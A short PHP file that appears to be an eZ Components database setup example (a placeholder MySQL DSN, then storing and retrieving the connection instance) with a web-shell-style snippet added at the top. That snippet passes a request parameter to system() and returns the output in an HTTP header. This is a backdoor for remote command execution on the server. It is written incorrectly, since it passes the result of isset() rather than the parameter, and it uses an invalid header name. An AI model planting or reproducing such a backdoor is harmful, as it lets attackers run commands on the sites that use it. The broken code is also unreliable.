<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

$db = ezcDbFactory::create( 'mysql://user:password@host/database' );
ezcDbInstance::set( $db );

// anywhere later in your program you can retrieve the db instance again using
$db = ezcDbInstance::get();

?>
